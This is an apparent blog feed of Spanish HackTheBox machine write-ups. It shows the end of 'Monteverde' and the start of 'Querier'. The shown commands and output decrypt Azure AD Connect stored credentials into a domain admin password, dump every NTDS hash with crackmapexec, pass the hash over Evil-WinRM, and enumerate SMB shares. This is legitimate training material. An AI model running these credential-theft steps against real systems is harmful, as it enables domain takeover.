<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
2314ead90ec16835111baba6c8982424
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Si vemos información del usuario que tenemos pertenecemos al grupo <code class="language-plaintext highlighter-rouge">Azure Admins</code> <a href="https://azure.microsoft.com/es-mx/free/search/?ef_id=_k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;OCID=AIDcmmxotgtm93_SEM__k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;gad_source=1&amp;gclid=Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB">https://azure.microsoft.com/es-mx/free/search/?ef_id=_k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;OCID=AIDcmmxotgtm93_SEM__k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;gad_source=1&amp;gclid=Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB</a>.</li>
</ul>

<blockquote>
  <p>Microsoft Azure es una plataforma de computación en la nube creado por Microsoft para construir, probar, desplegar y administrar aplicaciones y servicios mediante el uso de sus centros de datos.</p>
</blockquote>

<ul>
  <li>Si vamos ala raíz hay una carpeta con el nombre <code class="language-plaintext highlighter-rouge">Program Files</code> que contiene archivos sobre este servicio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="s1">'Program Files'</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogram Files


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files&gt;
</code></pre></div></div>

<ul>
  <li><a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a>, <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a>.</li>
</ul>

<blockquote>
  <p>The Azure AD Connect service is essentially responsible for synchronizing things between your local AD domain, and the Azure based domain. However, to do this it needs privileged credentials for your local domain so that it can perform various operations such as syncing passwords etc.</p>
</blockquote>

<iframe width="560" height="315" src="https://www.youtube.com/embed/JEIR5oGCwdg?si=7OpXxOEi_svvy2Di" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<ul>
  <li>
    <p>En el post nos comparten el siguiente repositorio <a href="https://github.com/VbScrub/AdSyncDecrypt/releases">https://github.com/VbScrub/AdSyncDecrypt/releases</a>.</p>
  </li>
  <li>
    <p>Nos dicen que tenemos que estas en la siguiente ruta para que funcione.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync&gt; <span class="nb">cd</span> <span class="s1">'C:\Program Files\Microsoft Azure AD Sync\Bin'</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span> <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in


</span>Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----         1/2/2020   2:53 PM                ADSync
d-----         1/2/2020   2:53 PM                ADSyncDiagnostics
d-----         1/2/2020   2:53 PM                Assemblies
d-----         1/2/2020   2:53 PM                Microsoft.VC100.CRT
<span class="nt">-a----</span>        8/31/2018   4:53 PM          32640 AADConfig.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          78920 AADPasswordResetExtension.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM        1579904 configdb.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          15416 csdelete.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM          35896 csexport.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM          25656 CSExportAnalyzer.exe
<span class="nt">-a----</span>         1/2/2020   2:53 PM            240 InstalledServiceInstances.config
<span class="nt">-a----</span>        8/31/2018   4:56 PM          86400 libutils.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM         284816 ManagedCustomActions.CA
<span class="nt">-a----</span>        8/31/2018   4:54 PM          37944 mapackager.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM         335744 mcrypt.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          98688 Microsoft.Azure.ActiveDirectory.Client.Framework.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         125496 Microsoft.Azure.ActiveDirectory.Synchronization.Config.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          94776 Microsoft.Azure.ActiveDirectory.Synchronization.Framework.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          37432 Microsoft.Azure.ActiveDirectory.Synchronization.PowerShellConfigAdapter.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          29568 Microsoft.Azure.ActiveDirectory.Synchronization.ProvisioningWebServiceAdapter.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          85568 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll
<span class="nt">-a----</span>        6/20/2017   1:52 PM             70 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll.config
<span class="nt">-a----</span>        8/31/2018   4:53 PM          30280 Microsoft.CredentialManagement.OnPremisesPasswordReset.Shared.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         143416 Microsoft.IdentityManagement.Error.ErrorBridge.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          18488 Microsoft.IdentityManagement.ManagedLogger.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         221056 Microsoft.IdentityManagement.PowerShell.ObjectModel.dll
<span class="nt">-a----</span>        5/23/2018   7:46 PM         295024 Microsoft.IdentityModel.Clients.ActiveDirectory.dll
<span class="nt">-a----</span>        5/23/2018   7:46 PM          22128 Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          17280 Microsoft.MetadirectoryServices.DataAccess.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          16768 Microsoft.MetadirectoryServices.Host.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          66432 Microsoft.MetadirectoryServices.Impl.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          27520 Microsoft.MetadirectoryServices.LDAPQueryClient.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          26688 Microsoft.MetadirectoryServices.PasswordHashSynchronization.Types.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          54344 Microsoft.MetadirectoryServices.Scheduler.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         507264 Microsoft.Online.Deployment.Framework.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          82304 Microsoft.Online.Deployment.PowerShell.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         116608 Microsoft.Online.PasswordSynchronization.Cryptography.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         136248 Microsoft.Online.PasswordSynchronization.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          23424 Microsoft.Online.PasswordSynchronization.Resources.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         196664 Microsoft.Online.PasswordSynchronization.Rpc.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM        3540032 Microsoft.ServiceBus.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM        2556984 miiserver.exe
<span class="nt">-a----</span>        8/31/2018   4:41 PM           5830 miiserver.exe.config
<span class="nt">-a----</span>        8/31/2018   4:53 PM          99896 miiskmu.exe
<span class="nt">-a----</span>        8/31/2018   4:55 PM          85568 mixedmodeutils.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         360504 mmscntrl.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          97848 mmsevent.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         725048 mmsmaad.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         567352 mmsmaext.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM        1424256 mmsmastate.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         431160 mmsmaxml.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          31288 mmsperf.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM           5686 mmsperf.h
<span class="nt">-a----</span>        8/31/2018   4:41 PM          12162 mmsperf.ini
<span class="nt">-a----</span>        8/31/2018   4:55 PM          37432 mmsperfmon.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         151096 mmsps.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         528768 mmsscpth.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          33152 MMSSERVERRCW.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         520064 mmsuihlp.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         222776 mmsutils.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM            978 mmswmi-x.mof
<span class="nt">-a----</span>        8/31/2018   4:55 PM         133688 mmswmi.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM           8441 mmswmi.mof
<span class="nt">-a----</span>        8/31/2018   4:55 PM         103496 PasswordHashConnectorManager.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          37952 PasswordHashSyncExtension.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          44104 Security.Cryptography.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM        1462328 storechk.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM          62008 SyncClrhost.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         135736 SyncRuleExpressions.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         172088 SyncRulesEngine.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         200760 SyncSetupUtl.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          26176 Tracing.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM          16510 Tracing.man


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>ADSync generalmente se ejecuta como un servicio en un servidor designado dentro de la infraestructura de la red local. Es responsable de mantener la sincronización continua entre el directorio activo local y Azure AD, asegurando que cualquier cambio realizado en uno de los directorios se refleje adecuadamente en el otro.</p>
</blockquote>

<ul>
  <li>Si descomprimimos el <code class="language-plaintext highlighter-rouge">.zip</code> vemos que obtenemos un <code class="language-plaintext highlighter-rouge">.exe</code> y un <code class="language-plaintext highlighter-rouge">.ddl</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z x AdDecrypt.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 152818 bytes <span class="o">(</span>150 KiB<span class="o">)</span>

Extracting archive: AdDecrypt.zip
<span class="nt">--</span>
Path <span class="o">=</span> AdDecrypt.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 152818

Everything is Ok

Files: 2
Size:       349096
Compressed: 152818
➜  content <span class="nb">ls
</span>AdDecrypt.exe  AdDecrypt.zip  azure.xml  mcrypt.dll  users.txt
</code></pre></div></div>

<ul>
  <li>En el post nos dicen que tenemos que subir los 2 archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\p</span>rogramdata


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----         1/2/2020   4:12 PM                AADConnect
d---s-         1/3/2020   4:47 AM                Microsoft
d-----        3/31/2024  11:35 AM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----         1/2/2020   9:15 PM                USOPrivate
d-----         1/2/2020   9:15 PM                USOShared
d-----         1/2/2020   9:37 PM                VMware
d-----         1/2/2020   2:35 PM                VsTelemetry
<span class="nt">-a----</span>        3/31/2024   1:22 PM          14848 AdDecrypt.exe
<span class="nt">-a----</span>        3/31/2024   1:22 PM         334248 mcrypt.dll
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos para ver la contraseña en texto plano.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span> C:<span class="se">\p</span>rogramdata<span class="se">\A</span>dDecrypt.exe <span class="nt">-FullSQL</span>

<span class="o">======================</span>
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
<span class="o">======================</span>

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Ahora ya nos podemos conectar gracias a que el ejecutable descifro las credenciales almacenadas dentro de la configuración <code class="language-plaintext highlighter-rouge">Azure AD Sync</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-p</span> d0m@in4dminyeah!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>megabank<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
026476efa67f5ba4e205392bb78817e4
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Aquí tenemos los hashes NT de todos los usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ crackmapexec smb 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-p</span> d0m@in4dminyeah! <span class="nt">--nt</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\a</span>dministrator:d0m@in4dminyeah! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.129.228.111  445    MONTEVERDE       Administrator:500:aad3b435b51404eeaad3b435b51404ee:100a42db8caea588a626d3a9378cd7ea:::
SMB         10.129.228.111  445    MONTEVERDE       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.228.111  445    MONTEVERDE       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3480c0ed5001f14fa7a49fdf016043ff:::
SMB         10.129.228.111  445    MONTEVERDE       AAD_987d7f2f57d2:1104:aad3b435b51404eeaad3b435b51404ee:599716220acac74a2d9049230d3a8b06:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\m</span>hope:1601:aad3b435b51404eeaad3b435b51404ee:f875f9a71efc6b0ee93dd906aedbc8b6:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:2602:aad3b435b51404eeaad3b435b51404ee:fd980edb4732d8175a52a9b5e1520bc1:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-ata:2603:aad3b435b51404eeaad3b435b51404ee:d192ea098c69b7d26c50808a5ac75bea:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:2604:aad3b435b51404eeaad3b435b51404ee:2e4de9439cfd99f861dec8fc460c47e3:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:2605:aad3b435b51404eeaad3b435b51404ee:6bd17d9707c3da465b96cdf0e1a3a4d6:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\d</span>galanos:2613:aad3b435b51404eeaad3b435b51404ee:7a695f4cc64a302d8e53da58f0885736:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\r</span>oleary:2614:aad3b435b51404eeaad3b435b51404ee:cb3fa0132c099c5b29c30ef128e90ad8:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>morgan:2615:aad3b435b51404eeaad3b435b51404ee:3a2b291c4291a1063a4b32e1770e5388:::
SMB         10.129.228.111  445    MONTEVERDE       MONTEVERDE<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:2e06005800e9c8981d41f5c109ca4c03:::
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Dumped 13 NTDS hashes to /home/miguel/.cme/logs/MONTEVERDE_10.129.228.111_2024-03-31_143351.ntds of which 12 were added to the database
</code></pre></div></div>

<ul>
  <li>También nos podemos conectar con el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-H</span> 100a42db8caea588a626d3a9378cd7ea

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Querier (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html" rel="alternate" type="text/html" title="HackTheBox - Querier (medium)" /><published>2024-04-09T00:00:00-06:00</published><updated>2024-04-09T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/9fe0cda48876d1e8772de183c9546f78.png" />
</p>

<p>En este post vamos a estar haciendo la maquina Querier de la plataforma de Hack The Box mediante la enumeración de un recurso compartido por smb vamos a descargador un archivo Excel en la cual mediante marcos encontraremos una función que contiene credenciales para conectarnos al servicio MSSQL que esta corriendo en la maquina ya dentro abusaremos del xp_dirtree para hacer una petición a nuestro recurso compartido y capturar el has ntlmv2 de un usuario que vamos a crackear para conectarnos de nuevo al servicio MSSQL y abusar del xp_cmdshell y obtener una reverse shell para la escalada de privilegios vamos a usar el gpp-decrypt para obtener la contraseña en texto plano que es del administrador y como extra explotaremos el SeImpersonatePrivilege.</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos con el escaneo de los puertos abiertos por el protocolo <strong>TCP</strong> y también escaneamos sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.67.247 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-05 12:44 CST
Nmap scan report <span class="k">for </span>10.129.67.247
Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
| ms-sql-ntlm-info:
|   10.129.67.247:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.67.247:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-04-05T18:40:54
|_Not valid after:  2054-04-05T18:40:54
|_ssl-date: 2024-04-05T18:45:35+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-05T18:45:27
|_  start_date: N/A
|_clock-skew: mean: <span class="nt">-1s</span>, deviation: 0s, median: <span class="nt">-1s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vemos propiedades de la maquina y el dominio al cual pertenece que es <code class="language-plaintext highlighter-rouge">HTB.LOCAL</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.67.247
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si listamos recursos compartidos por <strong>SMB</strong> vemos que no obtenemos nada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.67.247 <span class="nt">--shares</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap crackmapexec smb 10.129.67.247 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
</code></pre></div></div>

<ul>
  <li>Sin embargo si lo hacemos con la herramienta <code class="language-plaintext highlighter-rouge">smbclient</code> vemos que si nos muestra los típicos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">-L</span> 10.129.67.247 <span class="nt">-N</span>

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	Reports         Disk
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.129.67.247 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
